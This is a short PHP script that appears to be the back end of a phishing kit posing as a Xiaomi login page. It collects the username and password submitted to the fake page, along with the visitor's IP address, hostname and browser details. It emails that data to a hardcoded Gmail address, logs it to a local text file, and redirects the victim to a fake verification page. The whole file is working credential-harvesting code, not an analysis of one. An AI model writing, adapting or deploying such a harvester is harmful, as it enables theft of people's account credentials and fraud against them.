<?php

$emailstosend = "gcx.apple@gmail.com";
 $ip = $_SERVER['REMOTE_ADDR'];
 $id = $_POST['username'];
 $pass = $_POST['password'];

 if($id != "" & $pass != ""){


$subj = "$ip XIAOMI";
 $msg = " --------------------Start----------------------\n
  USER ID: $id \n
  PASS: $pass \n
  HOST    : ".gethostbyaddr($ip)."
  BROWSER : ".$_SERVER['HTTP_USER_AGENT']."
  IP: $ip \n --------------------END----------------------";
  mail("$emailstosend", "$subj", "$msg");

  $myfile = fopen("z.txt", "a") or die("Unable to open file!");
$txt = $msg;
fwrite($myfile, $txt);
fclose($myfile);

  header("location: verification.htm");


  echo '<meta http-equiv="refresh"
  content="0; url= verification.htm">';
 }else{


      header("location: index.htm");

     echo '<meta http-equiv="refresh"
  content="0; url=../index.php">';
 }


  ?>
  
  


